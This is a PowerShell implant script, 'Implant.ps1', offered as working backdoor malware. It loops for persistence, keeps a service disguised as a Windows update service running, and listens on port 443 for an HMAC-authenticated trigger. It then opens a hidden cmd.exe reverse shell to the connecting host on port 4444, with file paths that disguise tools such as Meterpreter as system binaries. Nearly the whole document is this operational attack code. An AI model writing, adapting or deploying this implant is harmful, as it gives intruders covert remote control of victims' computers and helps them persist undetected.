# Implant.ps1 - Main persistence loop
$SharedSecret = "bluewinstheday!!"
$TriggerPort  = 443
$ReversePort  = 4444


$MeterpreterPath = "C:\Windows\System32\SystemHealthMonitor.exe"
$NidhoggClient   = "C:\Windows\System32\wuauclt.exe"
$SetupScript     = "C:\Windows\System32\SystemHealth.ps1"

while ($true) {
    try {
        # Keep driver running
        if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
            sc.exe start WindowsUpdateSvc | Out-Null
        }

        while ($true) {
            $listener = $null
            try {
                $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $TriggerPort)
                $listener.Start()

                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                $reader = New-Object System.IO.StreamReader($stream)
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.AutoFlush = $true

                # === HMAC-SHA256 Challenge-Response (as requested) ===
                $challenge = Get-Random -Maximum 1000000000
                $writer.WriteLine("CHALLENGE:$challenge")

                $response = $reader.ReadLine().Trim()

                # Compute expected HMAC
                $hmac = New-Object System.Security.Cryptography.HMACSHA256
                $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
                $expectedBytes = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge"))
                $expected = -join ($expectedBytes | ForEach-Object { $_.ToString("x2") })
                # ====================================================

                if ($response -eq $expected) {
                    $writer.WriteLine("OK - Launching reverse shell...")
                    Start-Sleep -Seconds 1

                    # Get the IP of whoever just connected
                    $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
                    $listener.Stop()

                    Write-Host "[+] Password accepted! Sending reverse TCP shell to $remoteIP`:$ReversePort" -ForegroundColor Green

                    # === Launch reverse TCP shell back to the connecting IP ===
                    $revClient = New-Object System.Net.Sockets.TCPClient($remoteIP, $ReversePort)
                    $revStream = $revClient.GetStream()
                    $revWriter = New-Object System.IO.StreamWriter($revStream)
                    $revReader = New-Object System.IO.StreamReader($revStream)
                    $revWriter.AutoFlush = $true

                    # Start cmd.exe and pipe everything
                    $process = New-Object System.Diagnostics.Process
                    $process.StartInfo.FileName = "cmd.exe"
                    $process.StartInfo.RedirectStandardInput = $true
                    $process.StartInfo.RedirectStandardOutput = $true
                    $process.StartInfo.RedirectStandardError = $true
                    $process.StartInfo.UseShellExecute = $false
                    $process.StartInfo.WindowStyle = "Hidden"
                    $process.Start()

                    # Pipe I/O between cmd.exe and the reverse connection
                    while (-not $process.HasExited) {
                        if ($revStream.DataAvailable) {
                            $cmd = $revReader.ReadLine()
                            if ($cmd) { $process.StandardInput.WriteLine($cmd) }
                        }
                        if (-not $process.StandardOutput.EndOfStream) {
                            $output = $process.StandardOutput.ReadLine()
                            if ($output) { $revWriter.WriteLine($output) }
                        }
                    }
                } else {
                    $writer.WriteLine("DENIED")
                    $client.Close()
                    $listener.Stop()
                    Start-Sleep -Seconds 10
                }
            }
            catch {
                if ($listener) { $listener.Stop() }
                Start-Sleep -Seconds 3
            }
        }
        
        Start-Sleep -Seconds 45
    }
    catch {
        Start-Sleep -Seconds 30
    }
}